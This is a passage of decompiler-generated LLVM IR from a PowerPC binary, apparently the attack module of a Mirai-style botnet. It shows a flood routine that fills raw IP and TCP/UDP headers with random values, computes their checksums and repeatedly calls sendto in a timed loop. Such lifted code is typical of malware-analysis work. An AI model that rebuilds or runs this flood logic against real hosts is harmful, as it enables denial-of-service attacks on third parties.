  %v0_10005648 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005648, label %dec_label_pc_1000575c, label %dec_label_pc_1000564c

dec_label_pc_1000564c:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005648
  %v0_1000564c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000564c, label %dec_label_pc_10005768, label %dec_label_pc_10005650

dec_label_pc_10005650:                            ; preds = %dec_label_pc_1000575c, %dec_label_pc_1000564c
  %v0_10005650 = load i32, i32* @r24, align 4
  %v1_10005650 = mul i32 %v0_10005650, 16
  %v2_10005650 = udiv i32 %v0_10005650, 268435456
  %v3_10005650 = or i32 %v2_10005650, %v1_10005650
  store i32 %v3_10005650, i32* %r24.global-to-local, align 4
  %v1_10005654 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10005650)
  %v1_10005658 = mul nuw i32 %v2_10005650, 268435456
  %v2_10005658 = urem i32 %v0_10005650, 268435456
  %v3_10005658 = or i32 %v1_10005658, %v2_10005658
  store i32 %v3_10005658, i32* @r24, align 4
  %v0_1000565c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000565c, label %dec_label_pc_10005780, label %dec_label_pc_10005660

dec_label_pc_10005660:                            ; preds = %dec_label_pc_10005768, %dec_label_pc_10005650, %dec_label_pc_10005780
  %v0_10005660 = load i32, i32* @r31, align 4
  store i32 %v0_10005660, i32* @r3, align 4
  %v0_10005664 = load i32, i32* @r27, align 4
  store i32 %v0_10005664, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000566c.91 to i32), i32* @lr, align 4
  %v0_10005668 = call i32 @rand_alphastr()
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005670 = load i32, i32* @r31, align 4
  %v2_10005670 = load i32, i32* @r27, align 4
  %v4_10005670 = add i32 %v2_10005670, %v1_10005670
  %v5_10005670 = inttoptr i32 %v4_10005670 to i8*
  store i8 0, i8* %v5_10005670, align 1
  %v0_10005678 = load i32, i32* @r30, align 4
  %v1_10005678 = trunc i32 %v0_10005678 to i16
  %v2_10005678 = load i32, i32* @r29, align 4
  %v3_10005678 = add i32 %v2_10005678, 10
  %v4_10005678 = inttoptr i32 %v3_10005678 to i16*
  store i16 %v1_10005678, i16* %v4_10005678, align 2
  %v0_1000567c = load i32, i32* @r29, align 4
  store i32 %v0_1000567c, i32* @r3, align 4
  %v2_10005680 = call i32 @checksum_generic(i32 %v0_1000567c, i32 20)
  %v3_10005680 = trunc i32 %v2_10005680 to i16
  %v0_10005684 = load i32, i32* @r28, align 4
  store i32 %v0_10005684, i32* @r4, align 4
  %v3_10005688 = load i32, i32* @r29, align 4
  %v4_10005688 = add i32 %v3_10005688, 10
  %v5_10005688 = inttoptr i32 %v4_10005688 to i16*
  store i16 %v3_10005680, i16* %v5_10005688, align 2
  %v0_1000568c = load i32, i32* @r26, align 4
  %v0_10005690 = load i32, i32* @r30, align 4
  %v1_10005690 = trunc i32 %v0_10005690 to i16
  %v2_10005690 = load i32, i32* @r28, align 4
  %v3_10005690 = add i32 %v2_10005690, 6
  %v4_10005690 = inttoptr i32 %v3_10005690 to i16*
  store i16 %v1_10005690, i16* %v4_10005690, align 2
  %v0_10005694 = load i32, i32* @r29, align 4
  store i32 %v0_10005694, i32* %r3.global-to-local, align 4
  %v0_10005698 = load i32, i32* @r28, align 4
  %v1_10005698 = add i32 %v0_10005698, 4
  %v2_10005698 = inttoptr i32 %v1_10005698 to i16*
  %v3_10005698 = load i16, i16* %v2_10005698, align 2
  %v4_10005698 = zext i16 %v3_10005698 to i32
  %v4_1000569c = call i32 @checksum_tcpudp(i32 %v0_10005694, i32 %v0_10005684, i32 %v4_10005698, i32 %v0_1000568c)
  %v5_1000569c = trunc i32 %v4_1000569c to i16
  store i32 %v4_1000569c, i32* %r3.global-to-local, align 4
  %v3_100056a0 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100056a0, i32* %r7.global-to-local, align 4
  %v0_100056a4 = load i32, i32* @r28, align 4
  %v1_100056a4 = add i32 %v0_100056a4, 2
  %v2_100056a4 = inttoptr i32 %v1_100056a4 to i16*
  %v3_100056a4 = load i16, i16* %v2_100056a4, align 2
  %v4_100056a4 = zext i16 %v3_100056a4 to i32
  store i32 %v4_100056a4, i32* %r0.global-to-local, align 4
  %v0_100056a8 = load i32, i32* @r29, align 4
  %v1_100056ac = mul i32 %v3_100056a0, 24
  store i32 %v1_100056ac, i32* %r7.global-to-local, align 4
  %v4_100056b0 = add i32 %v0_100056a4, 6
  %v5_100056b0 = inttoptr i32 %v4_100056b0 to i16*
  store i16 %v5_1000569c, i16* %v5_100056b0, align 2
  %v0_100056b4 = load i32, i32* @r25, align 4
  %v0_100056b8 = load i32, i32* @r23, align 4
  store i32 %v0_100056b8, i32* %r3.global-to-local, align 4
  %v0_100056bc = load i32, i32* %r7.global-to-local, align 4
  %v1_100056bc = load i32, i32* %r19.global-to-local, align 4
  %v2_100056bc = add i32 %v1_100056bc, %v0_100056bc
  store i32 %v2_100056bc, i32* %r7.global-to-local, align 4
  %v0_100056c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100056c4 = trunc i32 %v0_100056c4 to i16
  %v3_100056c4 = add i32 %v2_100056bc, 2
  %v4_100056c4 = inttoptr i32 %v3_100056c4 to i16*
  store i16 %v1_100056c4, i16* %v4_100056c4, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  %v0_100056cc = load i32, i32* @r22, align 4
  %v2_100056cc = add i32 %v2_100056bc, 4
  %v3_100056cc = inttoptr i32 %v2_100056cc to i32*
  store i32 %v0_100056cc, i32* %v3_100056cc, align 4
  store i32 268457684, i32* @lr, align 4
  %v6_100056d0 = call i32 @__libc_sendto(i32 %v0_100056b8, i32 %v0_100056a8, i32 %v0_100056b4, i32 16384, i32 %v2_100056bc, i32 16)
  store i32 %v6_100056d0, i32* %r3.global-to-local, align 4
  %v3_100056d4 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100056d4, i32* %r9.global-to-local, align 4
  %v1_100056d8 = add i32 %v3_100056d4, 1
  store i32 %v1_100056d8, i32* %r0.global-to-local, align 4
  %v1_100056dc = load i32, i32* %r20.global-to-local, align 4
  %v2_100056dc = icmp slt i32 %v1_100056d8, %v1_100056dc
  %v4_100056dc = icmp eq i32 %v1_100056d8, %v1_100056dc
  store i1 %v4_100056dc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100056d8, i32* %stack_var_-2200, align 4
  br i1 %v2_100056dc, label %dec_label_pc_10005630, label %dec_label_pc_100056e8

dec_label_pc_100056e8:                            ; preds = %dec_label_pc_10005660, %dec_label_pc_10005610
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100056ec = call i32 @__GI_time()
  store i32 %v0_100056ec, i32* %r3.global-to-local, align 4
  store i32 %v2_100053fc, i32* %r0.global-to-local, align 4
  %v2_100056f4 = icmp slt i32 %v2_100053fc, %v0_100056ec
  %v4_100056f4 = icmp eq i32 %v2_100053fc, %v0_100056ec
  store i1 %v4_100056f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100056f4, label %dec_label_pc_100056fc, label %dec_label_pc_10005610

dec_label_pc_100056fc:                            ; preds = %dec_label_pc_100056e8, %dec_label_pc_10005408, %dec_label_pc_100053f0, %dec_label_pc_1000583c
  store i32 %v0_1000517c, i32* %r0.global-to-local, align 4
  %v1_10005710 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10005168)
  store i32 %v0_100051b0, i32* %r24.global-to-local, align 4
  store i32 %v0_100051b4, i32* %r25.global-to-local, align 4
  store i32 %v0_100051d8, i32* %r27.global-to-local, align 4
  store i32 %v0_100051dc, i32* %r30.global-to-local, align 4
  store i32 %v0_100051cc, i32* %r31.global-to-local, align 4
  %v0_10005758 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10005758

dec_label_pc_1000575c:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005648
  %v0_1000575c = call i32 @rand_next()
  %v1_1000575c = trunc i32 %v0_1000575c to i16
  store i32 %v0_1000575c, i32* %r3.global-to-local, align 4
  %v3_10005760 = load i32, i32* @r29, align 4
  %v4_10005760 = add i32 %v3_10005760, 20
  %v5_10005760 = inttoptr i32 %v4_10005760 to i16*
  store i16 %v1_1000575c, i16* %v5_10005760, align 2
  %v0_10005764 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10005764, label %dec_label_pc_10005768, label %dec_label_pc_10005650

dec_label_pc_10005768:                            ; preds = %dec_label_pc_1000575c, %dec_label_pc_1000564c
  %v0_10005768 = call i32 @rand_next()
  %v1_10005768 = trunc i32 %v0_10005768 to i16
  store i32 %v0_10005768, i32* %r3.global-to-local, align 4
  %v0_1000576c = load i32, i32* @r24, align 4
  %v1_1000576c = mul i32 %v0_1000576c, 16
  %v2_1000576c = udiv i32 %v0_1000576c, 268435456
  %v3_1000576c = or i32 %v2_1000576c, %v1_1000576c
  store i32 %v3_1000576c, i32* %r24.global-to-local, align 4
  %v1_10005770 = call %0 @__asm_mtcrf(i32 1, i32 %v3_1000576c)
  %v1_10005774 = mul nuw i32 %v2_1000576c, 268435456
  %v2_10005774 = urem i32 %v0_1000576c, 268435456
  %v3_10005774 = or i32 %v1_10005774, %v2_10005774
  store i32 %v3_10005774, i32* @r24, align 4
  %v3_10005778 = load i32, i32* @r28, align 4
  %v4_10005778 = add i32 %v3_10005778, 2
  %v5_10005778 = inttoptr i32 %v4_10005778 to i16*
  store i16 %v1_10005768, i16* %v5_10005778, align 2
  %v0_1000577c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000577c, label %dec_label_pc_10005780, label %dec_label_pc_10005660

dec_label_pc_10005780:                            ; preds = %dec_label_pc_10005768, %dec_label_pc_10005650
  %v0_10005780 = call i32 @rand_next()
  %v1_10005780 = trunc i32 %v0_10005780 to i16
  store i32 %v0_10005780, i32* %r3.global-to-local, align 4
  %v3_10005784 = load i32, i32* @r29, align 4
  %v4_10005784 = add i32 %v3_10005784, 28
  %v5_10005784 = inttoptr i32 %v4_10005784 to i16*
  store i16 %v1_10005780, i16* %v5_10005784, align 2
  br label %dec_label_pc_10005660

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_10005630
  %v0_1000578c = call i32 @rand_next()
  %v1_1000578c = trunc i32 %v0_1000578c to i16
  store i32 %v0_1000578c, i32* %r3.global-to-local, align 4
  %v3_10005790 = load i32, i32* @r29, align 4
  %v4_10005790 = add i32 %v3_10005790, 4
  %v5_10005790 = inttoptr i32 %v4_10005790 to i16*
  store i16 %v1_1000578c, i16* %v5_10005790, align 2
  %v0_10005794 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005794, label %dec_label_pc_1000575c, label %dec_label_pc_1000564c

dec_label_pc_1000579c:                            ; preds = %dec_label_pc_10005514
  %v0_1000579c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000579c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_100057a4 = inttoptr i32 %v0_1000579c to i8*
  store i8 0, i8* %v3_100057a4, align 1
  %v0_100057a8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100057a8 = load i32, i32* @r29, align 4
  %v2_100057a8 = add i32 %v1_100057a8, %v0_100057a8
  store i32 %v2_100057a8, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_100057b0 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100057b0, i32* %r9.global-to-local, align 4
  %v3_100057b4 = add i32 %v2_100057a8, 4
  %v4_100057b4 = inttoptr i32 %v3_100057b4 to i16*
  store i16 1, i16* %v4_100057b4, align 2
  %v0_100057b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057b8 = add i32 %v0_100057b8, 1
  store i32 %v1_100057b8, i32* %r31.global-to-local, align 4
  %v0_100057bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100057bc = trunc i32 %v0_100057bc to i16
  %v2_100057bc = load i32, i32* %r11.global-to-local, align 4
  %v3_100057bc = add i32 %v2_100057bc, 2
  %v4_100057bc = inttoptr i32 %v3_100057bc to i16*
  store i16 %v1_100057bc, i16* %v4_100057bc, align 2
  %v0_100057c0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100057c0 = load i32, i32* %r20.global-to-local, align 4
  %v2_100057c0 = icmp slt i32 %v0_100057c0, %v1_100057c0
  %v4_100057c0 = icmp eq i32 %v0_100057c0, %v1_100057c0
  store i1 %v4_100057c0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100057c0, i32* %stack_var_-2200, align 4
  br i1 %v2_100057c0, label %dec_label_pc_100054b0, label %dec_label_pc_100055e4.loopexit

dec_label_pc_100057d0:                            ; preds = %dec_label_pc_100053bc
  br label %dec_label_pc_100057d4

dec_label_pc_100057d4:                            ; preds = %dec_label_pc_100053c4, %dec_label_pc_100057d0
  %v1_100057d4 = phi i32 [ %v0_100053c8, %dec_label_pc_100057d0 ], [ %v1_1000537c, %dec_label_pc_100053c4 ]
  %v2_100057d4 = sub i32 %v1_100057d4, %v0_10005358
  %v2_100057d8 = ptrtoint i32* %stack_var_-2196 to i32
  store i32 %v2_100057d8, i32* %r3.global-to-local, align 4
  store i32 268457964, i32* @lr, align 4
  %v3_100057e8 = call i32 @util_memcpy(i32 %v2_100057d8, i32 %v2_10005374, i32 %v2_100057d4)
  %v0_100057ec = load i32, i32* @r1, align 4
  %v2_100057ec = add i32 %v2_100057d4, %v0_100057ec
  store i32 %v2_100057ec, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_100057d8, i32* %r3.global-to-local, align 4
  %v3_100057f8 = add i32 %v2_100057ec, 12
  %v4_100057f8 = inttoptr i32 %v3_100057f8 to i8*
  store i8 0, i8* %v4_100057f8, align 1
  store i32 268457984, i32* @lr, align 4
  %v1_100057fc = call i32 @inet_addr(i32 %v2_100057d8)
  store i32 %v1_100057fc, i32* %r3.global-to-local, align 4
  store i32 %v1_100057fc, i32* @r22, align 4
  br label %dec_label_pc_100053f0

dec_label_pc_10005808:                            ; preds = %dec_label_pc_100053e0
  %v2_10005808 = icmp eq i32 %v1_100053d4, 3
  %v3_10005808 = icmp eq i32 %v1_100053d4, 2
  store i1 %v3_10005808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005808, label %dec_label_pc_10005830, label %dec_label_pc_10005810

dec_label_pc_10005810:                            ; preds = %dec_label_pc_10005808
  store i1 %v2_10005808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10005808, label %dec_label_pc_10005818, label %dec_label_pc_100053f0

dec_label_pc_10005818:                            ; preds = %dec_label_pc_10005810
  store i32 67240450, i32* @r22, align 4
  br label %dec_label_pc_100053f0

dec_label_pc_10005824:                            ; preds = %dec_label_pc_100053d0
  store i32 1246898730, i32* @r22, align 4
  br label %dec_label_pc_100053f0

dec_label_pc_10005830:                            ; preds = %dec_label_pc_10005808
  store i32 1074151430, i32* @r22, align 4
  br label %dec_label_pc_100053f0

dec_label_pc_1000583c:                            ; preds = %dec_label_pc_10005430
  %v0_1000583c = load i32, i32* @r23, align 4
  store i32 %v0_1000583c, i32* @r3, align 4
  %v0_10005840 = call i32 @__GI___libc_close()
  store i32 %v0_10005840, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100056fc

; uselistorder directives
  uselistorder i1 %v2_10005808, { 1, 0 }
  uselistorder i32 %v2_100057d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000578c, { 1, 0 }
  uselistorder i32 %v0_10005780, { 1, 0 }
  uselistorder i32 %v0_1000576c, { 2, 1, 0 }
  uselistorder i32 %v0_10005768, { 1, 0 }
  uselistorder i32 %v0_1000575c, { 1, 0 }
  uselistorder i32 %v0_100056ec, { 1, 0, 2 }
  uselistorder i32 %v1_100056d8, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_1000569c, { 1, 0 }
  uselistorder i32 %v0_10005650, { 2, 1, 0 }
  uselistorder i32 %v1_10005630, { 1, 0 }
  uselistorder i32 %v2_1000561c, { 2, 1, 0 }
  uselistorder i32 %v0_10005600, { 1, 0 }
  uselistorder i32 %v1_100055b8, { 2, 1, 0 }
  uselistorder i32 %v1_100055b4, { 1, 0 }
  uselistorder i32 %v0_100055ac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100055a8, { 1, 0 }
  uselistorder i32 %v1_10005598, { 1, 2, 0 }
  uselistorder i32 %v1_10005590, { 0, 2, 1 }
  uselistorder i32 %v1_10005584, { 1, 0 }
  uselistorder i32 %v1_100054c8, { 1, 0 }
  uselistorder i32 %v1_100054c0, { 1, 0 }
  uselistorder i32 %v2_10005484, { 1, 2, 0 }
  uselistorder i32 %v0_10005484, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10005470, { 1, 0 }
  uselistorder i32 %v1_1000546c, { 1, 0 }
  uselistorder i32 %v2_100053fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100053f8, { 1, 0, 2 }
  uselistorder i32 %v1_100053d4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_100053cc, { 2, 1, 0 }
  uselistorder i32 %v1_100053c8, { 1, 0 }
  uselistorder i32 %v1_10005398, { 1, 0 }
  uselistorder i32 %v1_10005394, { 1, 0 }
  uselistorder i32 %v0_10005384, { 1, 0 }
  uselistorder i32 %v0_100053c8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000537c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10005358, { 1, 2, 0, 4, 3, 6, 5, 7 }
  uselistorder i32 %v2_100052f0, { 2, 3, 1, 0, 4 }
  uselistorder i8 %v5_10005240, { 1, 0 }
  uselistorder i32* %stack_var_-2200, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 28, 11, 12, 13, 14, 15, 16, 1, 17, 19, 18, 20, 21, 22, 23, 24, 0, 25, 26, 27, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 27, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i32 38, { 0, 3, 1, 4, 2, 5, 6, 7, 8, 9 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 53, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 80, 81 }
  uselistorder label %dec_label_pc_100057d4, { 1, 0 }
  uselistorder label %dec_label_pc_100056fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100055e4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100055bc, { 1, 0 }
  uselistorder label %dec_label_pc_10005594, { 1, 0 }
  uselistorder label %dec_label_pc_10005514, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_100053c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100053bc, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp8 = icmp eq i32 %tmp, 1
  br i1 %tmp8, label %dec_label_pc_1000587c, label %dec_label_pc_10005854

dec_label_pc_10005854:                            ; preds = %entry
  %v1_10005854 = add i32 %arg1, -2
  %v1_10005858 = udiv i32 %v1_10005854, 2
  %v1_1000585c = add nuw i32 %v1_10005858, 1
  %v0_10005868.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10005868

dec_label_pc_10005868:                            ; preds = %dec_label_pc_10005868, %dec_label_pc_10005854
  %v0_10005878 = phi i32 [ %v1_10005878, %dec_label_pc_10005868 ], [ %v1_1000585c, %dec_label_pc_10005854 ]
  %v0_10005874 = phi i32 [ %v2_10005874, %dec_label_pc_10005868 ], [ 0, %dec_label_pc_10005854 ]
  %v0_10005870 = phi i32 [ %v1_10005870, %dec_label_pc_10005868 ], [ %v0_10005868.pre, %dec_label_pc_10005854 ]
  %v1_10005868 = inttoptr i32 %v0_10005870 to i16*
  %v2_10005868 = load i16, i16* %v1_10005868, align 2
  %v3_10005868 = zext i16 %v2_10005868 to i32
  %v1_10005870 = add i32 %v0_10005870, 2
  store i32 %v1_10005870, i32* @r3, align 4
  %v2_10005874 = add i32 %v3_10005868, %v0_10005874
  %v1_10005878 = add i32 %v0_10005878, -1
  %v2_10005878 = icmp eq i32 %v1_10005878, 0
  br i1 %v2_10005878, label %dec_label_pc_1000587c.loopexit, label %dec_label_pc_10005868

dec_label_pc_1000587c.loopexit:                   ; preds = %dec_label_pc_10005868
  %tmp11 = mul i32 %v1_10005858, -2
  %tmp10 = add i32 %v1_10005854, %tmp11
  br label %dec_label_pc_1000587c

dec_label_pc_1000587c:                            ; preds = %dec_label_pc_1000587c.loopexit, %entry
  %v0_10005888 = phi i32 [ 0, %entry ], [ %v2_10005874, %dec_label_pc_1000587c.loopexit ]
  %v0_1000587c = phi i32 [ %arg1, %entry ], [ %tmp10, %dec_label_pc_1000587c.loopexit ]
  %v3_1000587c = icmp eq i32 %v0_1000587c, 1
  br i1 %v3_1000587c, label %dec_label_pc_10005884, label %dec_label_pc_1000588c

dec_label_pc_10005884:                            ; preds = %dec_label_pc_1000587c
  %v0_10005884 = load i32, i32* @r3, align 4
  %v1_10005884 = add i32 %v0_10005884, 1
  %v2_10005884 = inttoptr i32 %v1_10005884 to i8*
  %v3_10005884 = load i8, i8* %v2_10005884, align 1
  %v4_10005884 = zext i8 %v3_10005884 to i32
  %v2_10005888 = add i32 %v4_10005884, %v0_10005888
  br label %dec_label_pc_1000588c

dec_label_pc_1000588c:                            ; preds = %dec_label_pc_1000587c, %dec_label_pc_10005884
  %v0_1000588c = phi i32 [ %v0_10005888, %dec_label_pc_1000587c ], [ %v2_10005888, %dec_label_pc_10005884 ]
  %v1_1000588c = urem i32 %v0_1000588c, 65536
  %v1_10005890 = udiv i32 %v0_1000588c, 65536
  %v2_10005894 = add nuw nsw i32 %v1_10005890, %v1_1000588c
  %v1_10005898 = udiv i32 %v2_10005894, 65536
  %v2_1000589c = add nuw nsw i32 %v1_10005898, %v2_10005894
  %v1_100058a0 = urem i32 %v2_1000589c, 65536
  %v1_100058a4 = xor i32 %v1_100058a0, 65535
  ret i32 %v1_100058a4

; uselistorder directives
  uselistorder i32 %v2_10005894, { 1, 0 }
  uselistorder i32 %v0_10005888, { 1, 0 }
  uselistorder i32 %v1_10005878, { 1, 0 }
  uselistorder i32 %v1_10005870, { 1, 0 }
  uselistorder label %dec_label_pc_1000588c, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v1_100058b4 = add i32 %arg1, 12
  %v2_100058b4 = inttoptr i32 %v1_100058b4 to i32*
  %v3_100058b4 = load i32, i32* %v2_100058b4, align 4
  %v1_100058b8 = add i32 %arg1, 16
  %v2_100058b8 = inttoptr i32 %v1_100058b8 to i32*
  %v3_100058b8 = load i32, i32* %v2_100058b8, align 4
  %tmp = icmp slt i32 %arg3, 2
  br i1 %tmp, label %dec_label_pc_100058f4, label %dec_label_pc_100058c0

dec_label_pc_100058c0:                            ; preds = %entry
  %v1_100058c0 = add i32 %arg3, -2
  %v1_100058c8 = icmp slt i32 %v1_100058c0, 0
  %v1_100058cc = udiv i32 %v1_100058c0, 2
  %v1_100058d0 = add nuw i32 %v1_100058cc, 1
  br i1 %v1_100058c8, label %dec_label_pc_1000595c, label %dec_label_pc_100058dc.preheader

dec_label_pc_100058dc.preheader:                  ; preds = %dec_label_pc_1000595c, %dec_label_pc_100058c0
  %v0_100058f04 = phi i32 [ 1, %dec_label_pc_1000595c ], [ %v1_100058d0, %dec_label_pc_100058c0 ]
  %v0_100058dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100058dc

dec_label_pc_100058dc:                            ; preds = %dec_label_pc_100058dc.preheader, %dec_label_pc_100058dc
  %v0_100058f0 = phi i32 [ %v0_100058f04, %dec_label_pc_100058dc.preheader ], [ %v1_100058f0, %dec_label_pc_100058dc ]
  %v0_100058ec = phi i32 [ 0, %dec_label_pc_100058dc.preheader ], [ %v2_100058ec, %dec_label_pc_100058dc ]
  %v0_100058e4 = phi i32 [ %v0_100058dc.pre, %dec_label_pc_100058dc.preheader ], [ %v1_100058e4, %dec_label_pc_100058dc ]
  %v1_100058dc = inttoptr i32 %v0_100058e4 to i16*
  %v2_100058dc = load i16, i16* %v1_100058dc, align 2
  %v3_100058dc = zext i16 %v2_100058dc to i32
  store i32 %v3_100058dc, i32* %r0.global-to-local, align 4
  %v1_100058e4 = add i32 %v0_100058e4, 2
  %v2_100058ec = add i32 %v3_100058dc, %v0_100058ec
  %v1_100058f0 = add i32 %v0_100058f0, -1
  %v2_100058f0 = icmp eq i32 %v1_100058f0, 0
  br i1 %v2_100058f0, label %dec_label_pc_100058f4.loopexit, label %dec_label_pc_100058dc

dec_label_pc_100058f4.loopexit:                   ; preds = %dec_label_pc_100058dc
  %tmp14 = mul i32 %v0_100058f04, -2
  %tmp13 = add i32 %tmp14, %arg3
  %v3_100058e8 = icmp eq i32 %tmp13, 1
  br i1 %v3_100058e8, label %dec_label_pc_10005948, label %dec_label_pc_100058f8

dec_label_pc_100058f4:                            ; preds = %entry
  %v3_100058ac = icmp eq i32 %arg3, 1
  br i1 %v3_100058ac, label %dec_label_pc_100058f4.dec_label_pc_10005948_crit_edge, label %dec_label_pc_100058f8

dec_label_pc_100058f4.dec_label_pc_10005948_crit_edge: ; preds = %dec_label_pc_100058f4
  %v0_10005948.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10005948

dec_label_pc_100058f8:                            ; preds = %dec_label_pc_100058f4.loopexit, %dec_label_pc_100058f4, %dec_label_pc_10005948
  %v1_10005920 = phi i32 [ 0, %dec_label_pc_100058f4 ], [ %v2_1000594c, %dec_label_pc_10005948 ], [ %v2_100058ec, %dec_label_pc_100058f4.loopexit ]
  %v1_100058f8 = urem i32 %v3_100058b4, 65536
  %v1_100058fc = add i32 %arg1, 9
  %v2_100058fc = inttoptr i32 %v1_100058fc to i8*
  %v3_100058fc = load i8, i8* %v2_100058fc, align 1
  %v4_100058fc = zext i8 %v3_100058fc to i32
  %v1_10005900 = urem i32 %v3_100058b8, 65536
  %v1_10005908 = udiv i32 %v3_100058b4, 65536
  %v1_10005910 = udiv i32 %v3_100058b8, 65536
  %v2_10005904 = add i32 %v1_100058f8, %arg2
  %v2_1000590c = add i32 %v2_10005904, %v1_10005908
  %v2_10005914 = add i32 %v2_1000590c, %v1_10005900
  %v2_10005918 = add i32 %v2_10005914, %v1_10005910
  %v2_1000591c = add i32 %v2_10005918, %v1_10005920
  %v2_10005920 = add i32 %v2_1000591c, %v4_100058fc
  store i32 %v2_10005920, i32* %r0.global-to-local, align 4
  %v1_10005924 = call i32 @__asm_rlwinm.(i32 %v2_10005920, i32 16, i32 16, i32 31)
  %v4_10005924 = icmp eq i32 %v1_10005924, 0
  br i1 %v4_10005924, label %dec_label_pc_1000593c, label %dec_label_pc_1000592c

dec_label_pc_1000592c:                            ; preds = %dec_label_pc_100058f8, %dec_label_pc_1000592c
  %v1_10005930 = phi i32 [ %v1_10005934, %dec_label_pc_1000592c ], [ %v1_10005924, %dec_label_pc_100058f8 ]
  %v0_1000592c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000592c = urem i32 %v0_1000592c, 65536
  %v2_10005930 = add i32 %v1_1000592c, %v1_10005930
  store i32 %v2_10005930, i32* %r0.global-to-local, align 4
  %v1_10005934 = call i32 @__asm_rlwinm.(i32 %v2_10005930, i32 16, i32 16, i32 31)
  %v4_10005934 = icmp eq i32 %v1_10005934, 0
